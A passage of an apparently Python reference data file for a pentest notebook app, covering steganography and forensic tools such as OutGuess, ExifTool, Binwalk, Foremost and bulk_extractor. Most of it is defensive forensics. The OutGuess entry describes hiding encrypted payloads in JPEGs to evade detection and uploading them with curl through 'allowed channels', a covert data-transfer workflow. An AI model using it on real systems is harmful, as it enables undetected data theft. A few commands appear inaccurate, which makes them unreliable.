        {"label": "Stegcracker", "url": "https://github.com/Paradoxis/StegCracker", "description": "Brute-force wrapper for steghide."},
        {"label": "DFIR stego analysis", "url": "https://dfir.blog/stego-triage/", "description": "Guidance for blue teams analyzing stego content."}
    ]
}
updates['outguess'] = {
    "id": "outguess",
    "name": "OutGuess",
    "summary": "OutGuess hides arbitrary data inside redundant bits of JPEG or PNM files while preserving statistics to avoid detection.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install via apt",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y outguess", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Use default binary",
            "steps": [
                {"detail": "outguess -h", "copyable": True}
            ]
        },
        {
            "platform": "Source compile",
            "summary": "Needed when customizing quantization tables",
            "steps": [
                {"detail": "git clone https://github.com/resurrecting-open-source-projects/outguess.git", "copyable": True},
                {"detail": "cd outguess && ./configure && make", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Embed file into JPEG", "command": "outguess -k secret -d secret.txt cover.jpg stego.jpg", "notes": ["-k sets passphrase, -d data"]},
        {"description": "Extract hidden data", "command": "outguess -k secret -r stego.jpg output.txt", "notes": ["Writes decrypted data"]},
        {"description": "Specify capacity", "command": "outguess -s 10 -k key -d payload.bin base.jpg out.jpg", "notes": ["-s sets bits per channel"]}
    ],
    "common_flags": [
        {"flag": "-d file", "description": "Data to embed"},
        {"flag": "-r file", "description": "Recover data"},
        {"flag": "-k pass", "description": "Passphrase"},
        {"flag": "-s bits", "description": "Strength/capacity"},
        {"flag": "-x", "description": "Preserve statistics (default)"}
    ],
    "operational_tips": [
        "OutGuess is designed for JPEG—use steghide for WAV/BMP payloads.",
        "Keep payload smaller than 5% of cover to minimize detection.",
        "Use unique passphrases per engagement to avoid cross-client reuse.",
        "Store original cover so you can prove modification delta." 
    ],
    "step_sequences": [
        {
            "title": "Payload creation",
            "steps": [
                {"title": "Encrypt data", "details": "Protect payload before hiding.", "command": "openssl enc -aes-256-cbc -in report.pdf -out report.enc"},
                {"title": "Embed", "details": "Hide encrypted file in JPEG.", "command": "outguess -k 'S3cret!' -d report.enc cover.jpg stego.jpg"},
                {"title": "Verify", "details": "Ensure extraction works.", "command": "outguess -k 'S3cret!' -r stego.jpg recovered.enc"}
            ]
        },
        {
            "title": "Forensic extraction",
            "steps": [
                {"title": "Inspect JPEG", "details": "Check quantization tables and EXIF.", "command": "exiftool suspect.jpg"},
                {"title": "Attempt brute force", "details": "Use wordlist for passphrase discovery.", "command": "outguess -k $(cat wordlist.txt) -r suspect.jpg loot.bin"},
                {"title": "Document evidence", "details": "Record success/failure and indicator.", "command": "sha256sum loot.bin"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Encrypt → Hide → Deliver",
            "stages": [
                {"label": "Encrypt", "description": "Protect payload before stego.", "command": "age -p payload.bin > payload.age"},
                {"label": "Hide", "description": "Embed with OutGuess.", "command": "outguess -k pass -d payload.age photo.jpg drop.jpg"},
                {"label": "Transmit", "description": "Send drop file through allowed channel.", "command": "curl -T drop.jpg https://fileshare"},
                {"label": "Verify", "description": "Send extraction instructions to customer.", "command": "outguess -k pass -r drop.jpg payload.age"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "data embedded flag", "meaning": "OutGuess confirmed payload addition.", "severity": "Info"},
        {"indicator": "not enough capacity", "meaning": "Reduce payload or use larger cover.", "severity": "Medium"},
        {"indicator": "passphrase incorrect", "meaning": "Extraction failed; escalate to brute force if needed.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Batch processing", "command": "for img in samples/*.jpg; do outguess -k key -d payload.bin $img out/$img; done", "scenario": "Mass-generate stego drops for red team exercises.", "notes": ["Track which file maps to each recipient."]},
        {"title": "Custom quantization", "command": "outguess -Q custom.qtable -k pass -d file.bin base.jpg out.jpg", "scenario": "Blend into camera-specific statistics.", "notes": ["Extract qtables from sample using jpeginfo -c"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "OutGuess manual", "url": "https://www.outguess.org/docs/", "description": "Official usage guide."},
        {"label": "JPEG steganography research", "url": "https://dfrws.org/sites/default/files/session-files/paper-embedding-secret-data-with-jpeg.pdf", "description": "Background on detection avoidance."},
        {"label": "Payload detection tools", "url": "https://github.com/Quibik/JstegDetect", "description": "Share with defenders in remediation recommendations."}
    ]
}
updates['exiftool'] = {
    "id": "exiftool",
    "name": "ExifTool",
    "summary": "ExifTool reads and writes metadata across thousands of file formats, helping investigators trace camera sources, timestamps, and hidden data.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install from apt",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y libimage-exiftool-perl", "copyable": True}
            ]
        },
        {
            "platform": "macOS (Homebrew)",
            "summary": "Install brew package",
            "steps": [
                {"detail": "brew install exiftool", "copyable": True}
            ]
        },
        {
            "platform": "Portable", "summary": "Download stand-alone binary",
            "steps": [
                {"detail": "curl -LO https://exiftool.org/Image-ExifTool-12.70.tar.gz", "copyable": True},
                {"detail": "tar xzf Image-ExifTool-12.70.tar.gz", "copyable": True},
                {"detail": "./exiftool(-k) test.jpg", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "List metadata", "command": "exiftool photo.jpg", "notes": ["Shows camera model, GPS, timestamps"]},
        {"description": "Remove GPS", "command": "exiftool -gps:all= -xmp:geotag= photo.jpg", "notes": ["Creates backup copy by default"]},
        {"description": "Export to JSON", "command": "exiftool -json evidence/*.jpg > metadata.json", "notes": ["Useful for ingestion into PT Journal"]}
    ],
    "common_flags": [
        {"flag": "-all:all", "description": "Read/write every tag"},
        {"flag": "-json/-csv", "description": "Structured output"},
        {"flag": "-gps:all=", "description": "Delete GPS tags"},
        {"flag": "-overwrite_original", "description": "Avoid creating _original backups"}
    ],
    "operational_tips": [
        "Use `exiftool -s -s -s` for concise tag names when diffing multiple files.",
        "Always hash files before and after metadata editing to show integrity.",
        "When anonymizing deliverables, strip both EXIF and XMP/ICC tags.",
        "For IR cases, compare DateTimeOriginal vs FileModifyDate to spot tampering." 
    ],
    "step_sequences": [
        {
            "title": "Image sanitization",
            "steps": [
                {"title": "Baseline metadata", "details": "Dump metadata to file for record.", "command": "exiftool -json photo.jpg > before.json"},
                {"title": "Strip sensitive fields", "details": "Remove GPS and serial numbers.", "command": "exiftool -gps:all= -serialnumber= -overwrite_original photo.jpg"},
                {"title": "Verify", "details": "Diff metadata after sanitization.", "command": "exiftool -json photo.jpg > after.json && diff before.json after.json"}
            ]
        },
        {
            "title": "Attribution investigation",
            "steps": [
                {"title": "Collect across set", "details": "Export metadata for entire evidence folder.", "command": "exiftool -csv -DateTimeOriginal -Make -Model -SerialNumber evidence/ > meta.csv"},
                {"title": "Pivot", "details": "Identify recurring devices or time anomalies.", "command": "csvtool col 2,3,4 meta.csv | sort | uniq -c"},
                {"title": "Report", "details": "Attach CSV + findings to PT Journal.", "command": "# PT Journal → Evidence → Upload meta.csv"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Collect → Sanitize → Deliver",
            "stages": [
                {"label": "Collect", "description": "Copy suspect media and hash.", "command": "sha256sum *.jpg > hashes.txt"},
                {"label": "Analyze", "description": "Parse metadata into structured format.", "command": "exiftool -json *.jpg > export.json"},
                {"label": "Sanitize", "description": "Strip sensitive info before sharing externally.", "command": "exiftool -gps:all= -Creator= -overwrite_original *.jpg"},
                {"label": "Deliver", "description": "Provide sanitized files + metadata diff to stakeholders.", "command": "tar czf sanitized.tar.gz sanitized/"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "GPS Latitude", "meaning": "Precise location of photo—handle as sensitive data.", "severity": "High"},
        {"indicator": "Serial Number", "meaning": "Can tie assets back to owner/equipment.", "severity": "Medium"},
        {"indicator": "ModifyDate != DateTimeOriginal", "meaning": "Potential tampering or editing event.", "severity": "Medium"}
    ],
    "advanced_usage": [
        {"title": "Recursive diff", "command": "exiftool -r -json images/ > before.json && exiftool -overwrite_original -all= images/ && exiftool -r -json images/ > after.json", "scenario": "Track exactly which tags were removed before publishing evidence.", "notes": ["Keep backups of originals"]},
        {"title": "Metadata injection", "command": "exiftool -Artist='PT Journal' -Copyright='2024 PTJ' file.png", "scenario": "Watermark deliverables or plant beacons in honeypot data.", "notes": ["Do not alter client-supplied evidence without approval"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Official ExifTool site", "url": "https://exiftool.org/", "description": "Downloads and documentation."},
        {"label": "Metadata reference", "url": "https://exiftool.org/TagNames/", "description": "Lookup for specific tag names."},
        {"label": "Photo forensics", "url": "https://29a.ch/photo-forensics/", "description": "Use alongside metadata when validating images."}
    ]
}
updates['binwalk'] = {
    "id": "binwalk",
    "name": "Binwalk",
    "summary": "Binwalk analyzes firmware images for embedded files, compressed sections, and executable code, and can automatically extract them for reversing.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install binary + extraction dependencies",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y binwalk p7zip-full gzip bzip2 tar sasquatch", "copyable": True}
            ]
        },
        {
            "platform": "pip/virtualenv",
            "summary": "Install latest binwalk from PyPI",
            "steps": [
                {"detail": "python3 -m venv ~/.venvs/binwalk", "copyable": True},
                {"detail": "~/.venvs/binwalk/bin/pip install binwalk", "copyable": True}
            ]
        },
        {
            "platform": "Docker",
            "summary": "Use container for consistent extraction",
            "steps": [
                {"detail": "docker run --rm -it -v $PWD:/work remnux/binwalk", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Scan firmware", "command": "binwalk firmware.bin", "notes": ["Detects known headers, compression, signatures"]},
        {"description": "Extract automatically", "command": "binwalk -eM firmware.bin", "notes": ["Recursively extracts nested archives"]},
        {"description": "Carve with signature file", "command": "binwalk -D 'png image:png' image.bin", "notes": ["Extracts specific file types only"]}
    ],
    "common_flags": [
        {"flag": "-e/-x", "description": "Extract (with or without recursion)"},
        {"flag": "-M", "description": "Matryoshka recursion"},
        {"flag": "-D <rule>", "description": "Carve by signature"},
        {"flag": "-B", "description": "Search for raw big-endian signatures"}
    ],
    "operational_tips": [
        "Install sasquatch and jefferson for SquashFS/UbiFS extraction.",
        "Use --dd='.*' to force dd-style carving when signature database misses proprietary formats.",
        "Combine with `strings` and `grep` to find hardcoded credentials quickly.",
        "Always copy firmware image before extraction—binwalk writes output directories alongside the file." 
    ],
    "step_sequences": [
        {
            "title": "Firmware triage",
            "steps": [
                {"title": "Identify architecture", "details": "Scan for CPU/OS strings.", "command": "binwalk firmware.bin"},
                {"title": "Extract filesystem", "details": "Use recursive extraction.", "command": "binwalk -eM firmware.bin"},
                {"title": "Mount and analyze", "details": "Inspect extracted squashfs/jffs2.", "command": "sudo unsquashfs -d rootfs _firmware.bin.extracted/squashfs-root.squashfs"}
            ]
        },
        {
            "title": "Hunting hardcoded secrets",
            "steps": [
                {"title": "Search strings", "details": "Look for passwords/keys.", "command": "strings -n 8 rootfs/bin/* | grep -i password"},
                {"title": "Inspect web config", "details": "Check default creds in config files.", "command": "grep -R 'admin' rootfs/etc"},
                {"title": "Document findings", "details": "Add evidence to PT Journal.", "command": "# PT Journal → Findings → Firmware secrets"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Download → Binwalk → Diff",
            "stages": [
                {"label": "Collect", "description": "Download firmware from vendor portal.", "command": "wget https://vendor/firmware.bin"},
                {"label": "Analyze", "description": "Run binwalk + extraction.", "command": "binwalk -eM firmware.bin"},
                {"label": "Diff", "description": "Compare with previous firmware for new components.", "command": "diff -ru prev/_firmware prev/new"},
                {"label": "Report", "description": "Highlight vulnerabilities/hardcoded secrets.", "command": "# PT Journal → Firmware assessment"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Compression: squaschfs", "meaning": "Firmware contains SquashFS—extract with unsquashfs.", "severity": "Info"},
        {"indicator": "Executable code section", "meaning": "Possible bootloader/ARM binary for reversing.", "severity": "Medium"},
        {"indicator": "Unknown header", "meaning": "Signature not recognized—create custom rule.", "severity": "Low"}
    ],
    "advanced_usage": [
        {"title": "Custom signatures", "command": "binwalk -y 'gzip' -y 'xz' firmware.bin", "scenario": "Limit output to specific formats for clarity.", "notes": ["Signature definitions live in /etc/binwalk/sig.bin"]},
        {"title": "Patch diffing", "command": "bindiff.py _old.extracted _new.extracted", "scenario": "Track vendor changes between firmware revisions.", "notes": ["Combine with git diff for config files"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Binwalk docs", "url": "https://github.com/ReFirmLabs/binwalk", "description": "Official documentation."},
        {"label": "Firmware security wiki", "url": "https://firmware.re/firmware/", "description": "Guides for router and IoT analysis."},
        {"label": "FACT (Firmware Analysis Comparison Tool)", "url": "https://github.com/fkie-cad/FACT_core", "description": "Use alongside binwalk for large assessments."}
    ]
}
updates['foremost'] = {
    "id": "foremost",
    "name": "Foremost",
    "summary": "Foremost is a forensic file carver that recovers deleted files from disk or memory images using header/footer signatures.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install from official repositories",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y foremost", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Check default config at /etc/foremost.conf",
            "steps": [
                {"detail": "ls /etc/foremost.conf", "copyable": True}
            ]
        },
        {
            "platform": "macOS (Homebrew)",
            "summary": "Install via brew",
            "steps": [
                {"detail": "brew install foremost", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Carve all defaults", "command": "foremost -i disk.img -o output", "notes": ["Creates per-filetype directories"]},
        {"description": "Limit to jpg/pdf", "command": "foremost -t jpg,pdf -i card.dd -o carved", "notes": ["Speeds up analysis"]},
        {"description": "Use custom config", "command": "foremost -c custom.conf -i dump.raw -o loot", "notes": ["Add proprietary signatures"]}
    ],
    "common_flags": [
        {"flag": "-i file", "description": "Input image"},
        {"flag": "-o dir", "description": "Output directory"},
        {"flag": "-t types", "description": "Comma-separated file types"},
        {"flag": "-c config", "description": "Alternate configuration"},
        {"flag": "-w", "description": "Audit only"}
    ],
    "operational_tips": [
        "Work on copies of disk images to preserve evidence.",
        "Customize /etc/foremost.conf with organization-specific signatures.",
        "Review output/audit.txt to trace offsets back to the original image.",
        "Follow carved files with exiftool or strings to validate usefulness." 
    ],
    "step_sequences": [
        {
            "title": "Evidence carve",
            "steps": [
                {"title": "Hash image", "details": "Record baseline hash.", "command": "sha256sum disk.img"},
                {"title": "Run foremost", "details": "Carve relevant file types.", "command": "foremost -t docx,pdf,jpg -i disk.img -o carve_out"},
                {"title": "Review", "details": "Sort carved files by timestamp.", "command": "find carve_out -type f -printf '%T+ %p\n' | sort"}
            ]
        },
        {
            "title": "Custom signature workflow",
            "steps": [
                {"title": "Edit config", "details": "Add new magic signatures.", "command": "sudo nano /etc/foremost.conf"},
                {"title": "Dry run", "details": "Use -w to test matches.", "command": "foremost -w -t custom -i sample.bin"},
                {"title": "Full carve", "details": "Run carve once validated.", "command": "foremost -t custom -i dump.raw -o custom_carve"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Acquire → Carve → Correlate",
            "stages": [
                {"label": "Acquire", "description": "Image disk/ram and hash.", "command": "dd if=/dev/sdb of=disk.img bs=4M status=progress"},
                {"label": "Carve", "description": "Run foremost with targeted file types.", "command": "foremost -t jpg,pdf -i disk.img -o /cases/123/carve"},
                {"label": "Correlate", "description": "Map carved files back to timeline.", "command": "log2timeline.py -q timeline.plaso /cases/123/carve"},
                {"label": "Report", "description": "Attach recovered artifacts to PT Journal.", "command": "# PT Journal → Evidence → Upload carve report"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "File: carved/jpg/00000001.jpg", "meaning": "File recovered successfully.", "severity": "Info"},
        {"indicator": "ERROR: could not allocate block", "meaning": "Image corruption or disk full.", "severity": "Medium"},
        {"indicator": "audit.txt offset", "meaning": "Use offset to prove original location.", "severity": "Info"}
    ],
    "advanced_usage": [
        {"title": "Parallel carving", "command": "foremost -T 4 -i disk.img -o carve", "scenario": "Use threaded fork (yforemost) on multi-core hosts.", "notes": ["Vanilla foremost is single-threaded—consider at-scale alternatives."]},
        {"title": "Memory carving", "command": "vol.py -f mem.raw filescan | awk '{print $2}' | xargs -I{} foremost -o mem_carve -i mem.raw -s {}", "scenario": "Pivot from Volatility offsets directly into carved files.", "notes": ["Great for credential artifacts in RAM dumps."]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Foremost man page", "url": "https://linux.die.net/man/1/foremost", "description": "Official usage."},
        {"label": "Foremost config guide", "url": "https://wiki.sleuthkit.org/index.php/Foremost", "description": "Explains header/footer syntax."},
        {"label": "Community signatures", "url": "https://github.com/AmberMD/foremost-signatures", "description": "Sample rules to extend built-in types."}
    ]
}
updates['strings'] = {
    "id": "strings",
    "name": "strings",
    "summary": "GNU strings extracts printable sequences from binaries, memory dumps, and firmware images for quick triage and hunting for hardcoded secrets.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Part of binutils",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y binutils", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Preinstalled",
            "steps": [
                {"detail": "strings --version", "copyable": True}
            ]
        },
        {
            "platform": "Windows (Sysinternals)",
            "summary": "Use strings.exe",
            "steps": [
                {"detail": "curl -O https://live.sysinternals.com/strings.exe", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Search binary for URLs", "command": "strings -a malware.bin | grep -i http", "notes": []},
        {"description": "UTF-16 support", "command": "strings -el payload.dll", "notes": ["-e l for little-endian UTF-16"]},
        {"description": "Limit length", "command": "strings -n 6 firmware.bin", "notes": ["Ignore shorter noise"]}
    ],
    "common_flags": [
        {"flag": "-a", "description": "Scan entire file"},
        {"flag": "-n <len>", "description": "Minimum string length"},
        {"flag": "-e l/b/s", "description": "Encoding (UTF-16 little/big, 7-bit)"},
        {"flag": "-t x/d/o", "description": "Print offsets"},
        {"flag": "-f file", "description": "Prefix filenames in output"}
    ],
    "operational_tips": [
        "Pipe strings into ripgrep or awk for quick filtering.",
        "Use -t d to align interesting strings with firmware offsets for reporting.",
        "Combine with binwalk or Volatility to analyze extracted sections.",
        "Run both ASCII and UTF-16 passes when looking at Windows binaries." 
    ],
    "step_sequences": [
        {
            "title": "Malware triage",
            "steps": [
                {"title": "ASCII sweep", "details": "Look for obvious IoCs.", "command": "strings -n 6 sample.bin | tee ascii.txt"},
                {"title": "Unicode sweep", "details": "Catch Windows resource strings.", "command": "strings -el sample.bin | tee unicode.txt"},
                {"title": "Pivot", "details": "Search for domains/APIs and add to PT Journal.", "command": "rg -i 'wininet|http' unicode.txt"}
            ]
        },
        {
            "title": "Firmware credential hunt",
            "steps": [
                {"title": "Extract strings", "details": "Dump strings with offsets.", "command": "strings -t x rootfs.bin > strings.txt"},
                {"title": "Filter", "details": "Search for password indicators.", "command": "grep -i 'pass\|key' strings.txt"},
                {"title": "Validate", "details": "Navigate to offset and confirm context.", "command": "xxd -g1 -s 0x123456 -l 64 rootfs.bin"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Dump → Filter → Report",
            "stages": [
                {"label": "Dump", "description": "Save ASCII & Unicode strings.", "command": "strings -a sample.bin > ascii.txt && strings -el sample.bin > unicode.txt"},
                {"label": "Filter", "description": "Use regex/wordlists to find secrets.", "command": "rg -f keywords.txt ascii.txt"},
                {"label": "Confirm", "description": "Cross-check with disassembly or hexdump.", "command": "radare2 -q -c 's 0xADDRESS; px 64' sample.bin"},
                {"label": "Document", "description": "Attach IoC list to PT Journal.", "command": "# PT Journal → Evidence → Upload strings summary"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "http://update.example.com", "meaning": "Possible command-and-control endpoint.", "severity": "High"},
        {"indicator": "APIKEY=", "meaning": "Hardcoded credential present.", "severity": "High"},
        {"indicator": "offset 0x12ab34", "meaning": "Use offset for reverse engineering context.", "severity": "Info"}
    ],
    "advanced_usage": [
        {"title": "Entropy-aware", "command": "binwalk -R 'AES' firmware.bin | cut -d: -f1 | xargs -I{} strings -s {} firmware.bin", "scenario": "Dump strings only from sections containing AES markers.", "notes": ["Reduces noise."]},
        {"title": "Memory captures", "command": "vol.py -f mem.raw strings -n 12 | tee mem_strings.txt", "scenario": "Pull live credentials from memory dumps.", "notes": ["Requires Volatility profile"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "GNU Binutils", "url": "https://sourceware.org/binutils/docs/binutils/strings.html", "description": "Official documentation."},
        {"label": "Sysinternals strings", "url": "https://learn.microsoft.com/sysinternals/downloads/strings", "description": "Windows version usage."},
        {"label": "Firmware strings hunting", "url": "https://trailofbits.github.io/firmware-security/strings.html", "description": "Best practices."}
    ]
}
updates['scalpel'] = {
    "id": "scalpel",
    "name": "Scalpel",
    "summary": "Scalpel is a high-performance file carver derived from Foremost with multithreading and flexible configuration syntax.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install from apt",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y scalpel", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Copy configuration template before editing",
            "steps": [
                {"detail": "sudo cp /etc/scalpel/scalpel.conf /etc/scalpel/scalpel.conf.bak", "copyable": True}
            ]
        },
        {
            "platform": "Source build",
            "summary": "Compile latest release",
            "steps": [
                {"detail": "git clone https://github.com/sleuthkit/scalpel.git", "copyable": True},
                {"detail": "cd scalpel && ./configure && make", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Default carve", "command": "scalpel disk.img -o scalpel_out", "notes": []},
        {"description": "Specific file types", "command": "scalpel -c jpg.conf image.dd -o jpg_only", "notes": []},
        {"description": "Resume run", "command": "scalpel -r scalpel.log", "notes": ["Restart from failed offset"]}
    ],
    "common_flags": [
        {"flag": "-c file", "description": "Use custom configuration"},
        {"flag": "-o dir", "description": "Output directory"},
        {"flag": "-b size", "description": "Read block size override"},
        {"flag": "-r log", "description": "Resume using log"}
    ],
    "operational_tips": [
        "Disable unused file types in scalpel.conf to reduce runtime.",
        "Scalpel is multi-threaded—set SCALPEL_THREADS env var to control CPU usage.",
        "Always carve to separate disks to avoid thrashing the evidence image.",
        "Keep the log file; it documents hits with offsets for reporting." 
    ],
    "step_sequences": [
        {
            "title": "Custom config carving",
            "steps": [
                {"title": "Prepare signature file", "details": "Enable only required file types.", "command": "grep -v '^#' /etc/scalpel/scalpel.conf > custom.conf"},
                {"title": "Run scalpel", "details": "Execute with custom config.", "command": "scalpel -c custom.conf memory.raw -o carve"},
                {"title": "Review log", "details": "Analyze hits and offsets.", "command": "less carve/scalpel.log"}
            ]
        },
        {
            "title": "Large image workflow",
            "steps": [
                {"title": "Split image", "details": "Use split/partclone to process chunks.", "command": "split -b 5G disk.img disk.part"},
                {"title": "Parallel carving", "details": "Run scalpel per chunk.", "command": "for part in disk.part*; do scalpel $part -o carve_$part & done"},
                {"title": "Merge results", "details": "Consolidate carved data and logs.", "command": "find carve_* -type f -print"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Configure → Carve → Validate",
            "stages": [
                {"label": "Configure", "description": "Tune scalpel.conf.", "command": "sed -i 's/#jpg/jpg/' /etc/scalpel/scalpel.conf"},
                {"label": "Carve", "description": "Run scalpel with logging.", "command": "scalpel disk.img -o carve_run"},
                {"label": "Validate", "description": "Hash carved files and tie to offsets.", "command": "sha256sum carve_run/jpg/*"},
                {"label": "Report", "description": "Attach carve log + sample files to PT Journal.", "command": "# PT Journal → Evidence → Upload scalpel log"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Scalpel completed with errors", "meaning": "Check log for bad sectors or misconfigured types.", "severity": "Medium"},
        {"indicator": "Hits: 120 jpg", "meaning": "Recovered items; verify for sensitive data.", "severity": "Info"},
        {"indicator": "Skipped | carved due to short file", "meaning": "Files under threshold; adjust config if necessary.", "severity": "Low"}
    ],
    "advanced_usage": [
        {"title": "Network storage", "command": "scalpel -c conf -O nfs://analysis/carve disk.img", "scenario": "Write carve output to remote share while processing.", "notes": ["Mount share prior to run"]},
        {"title": "Sleuth Kit integration", "command": "icat -i raw disk.img 5 | scalpel -c doc.conf -o carve_inode", "scenario": "Carve specific inode/partition output via TSK.", "notes": ["Combine with mmls/fls results"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Scalpel GitHub", "url": "https://github.com/sleuthkit/scalpel", "description": "Source and docs."},
        {"label": "Carving best practices", "url": "https://www.sleuthkit.org/sleuthkit/docs.php", "description": "Guidelines for forensic carving."},
        {"label": "Digital forensics corp", "url": "https://digitalforensicscorp.com/blog/file-carving/", "description": "Overview to share with non-technical stakeholders."}
    ]
}
updates['bulk_extractor'] = {
    "id": "bulk_extractor",
    "name": "bulk_extractor",
    "summary": "bulk_extractor scans disk images, memory dumps, or network captures and extracts artifacts such as emails, URLs, credit cards, and gzip fragments without relying on file system structures.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install package and feature plugins",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y bulk-extractor afflib libewf-tools", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Use bulk_extractor and beviewer GUI",
            "steps": [
                {"detail": "bulk_extractor -h", "copyable": True},
                {"detail": "beviewer", "copyable": True}
            ]
        },
        {
            "platform": "Source", "summary": "Build from GitHub for latest scanners",
            "steps": [
                {"detail": "git clone https://github.com/simsong/bulk_extractor.git", "copyable": True},
                {"detail": "cd bulk_extractor && ./configure && make && sudo make install", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Default scan", "command": "bulk_extractor -o output disk.dd", "notes": []},
        {"description": "Disable scanners", "command": "bulk_extractor -S email=0 -S http=0 -o focused image.E01", "notes": ["Only run needed scanners"]},
        {"description": "Process PCAP", "command": "bulk_extractor -o out capture.pcap", "notes": ["Supports many file types"]}
    ],
    "common_flags": [
        {"flag": "-o dir", "description": "Output directory"},
        {"flag": "-S name=value", "description": "Set scanner options"},
        {"flag": "-E <scanners>", "description": "Enable subset of scanners"},
        {"flag": "-R <size>", "description": "Block size (resume)"},
        {"flag": "-g", "description": "Generate histogram reports"}
    ],
    "operational_tips": [
        "Use feature files (.txt) to quickly grep for IoCs without opening the entire dataset.",
        "Open the BEViewer GUI to visualize histograms and carve contexts.",
        "Disable credit-card scanner when working with sensitive customer data unless explicitly scoped.",
        "Document scanner configuration (-S flags) so results are reproducible." 
    ],
    "step_sequences": [
        {
            "title": "Evidence processing",
            "steps": [
                {"title": "Run bulk_extractor", "details": "Scan disk image with default scanners.", "command": "bulk_extractor -o be_out disk.dd"},
                {"title": "Review reports", "details": "Open histograms + feature files.", "command": "beviewer be_out"},
                {"title": "Export IoCs", "details": "Filter emails/domains.", "command": "cut -f2 be_out/email.txt | sort -u > emails.txt"}
            ]
        },
        {
            "title": "Targeted scanning",
            "steps": [
                {"title": "Limit scanners", "details": "Focus on credit cards + URLs.", "command": "bulk_extractor -E ccnd,URL -o cc_out disk.dd"},
                {"title": "Validate hits", "details": "Use built-in verify tool.", "command": "python3 ccnbulk.py cc_out/ccn.txt"},
                {"title": "Report", "details": "Attach sanitized list to PT Journal.", "command": "# PT Journal → Evidence → Upload bulk extractor report"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Acquire → Scan → Triangulate",
            "stages": [
                {"label": "Acquire", "description": "Image drive with dd/ewfacquire.", "command": "ewfacquire /dev/sdb"},
                {"label": "Scan", "description": "Run bulk_extractor with relevant scanners.", "command": "bulk_extractor -E URL,email,exe -o case01 image.E01"},
                {"label": "Triangulate", "description": "Combine feature files with logs.", "command": "python3 correlate.py case01/email.txt prod_mailboxes.csv"},
                {"label": "Remediate", "description": "Share IoCs and removal instructions with client.", "command": "# PT Journal → Findings → Data exposure"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "EMAIL: user@example.com", "meaning": "Email found; confirm ownership.", "severity": "Info"},
        {"indicator": "CCN: 4111 1111 1111 1111", "meaning": "Possible payment data exposure—escalate per PCI requirements.", "severity": "High"},
        {"indicator": "URL: http://malware", "meaning": "Outbound beacon or malicious download site.", "severity": "Medium"}
    ],
    "advanced_usage": [
        {"title": "Resume large jobs", "command": "bulk_extractor -R 1073741824 -o be_out disk.dd", "scenario": "Automatically resumes after each gigabyte in case of interruption.", "notes": ["Use with --finish when job restarts"]},
        {"title": "Distributed scanning", "command": "bulk_extractor -o host1 disk.img & bulk_extractor -o host2 disk.img", "scenario": "Split image across multiple nodes; merge reports after.", "notes": ["Use be_merge.py to consolidate"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Official wiki", "url": "https://github.com/simsong/bulk_extractor/wiki", "description": "Usage and scanner docs."},
        {"label": "BEViewer", "url": "https://github.com/digitalsleuth/beviewer", "description": "GUI viewer."},
        {"label": "Bulk extractor training", "url": "https://digitalcorpora.org/corpora/disk-images/bulk-extractor-training", "description": "Sample images for practice."}
    ]
}
updates['xxd'] = {
    "id": "xxd",
    "name": "xxd",
    "summary": "xxd creates hexdumps and can reverse them back to binary, making it a quick option for inspecting files or patching bytes.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Provided by vim-common",
            "steps": [
                {"detail": "sudo apt install -y vim-common", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Preinstalled",
            "steps": [
                {"detail": "xxd -version", "copyable": True}
            ]
        },
        {
            "platform": "Windows (WSL)",
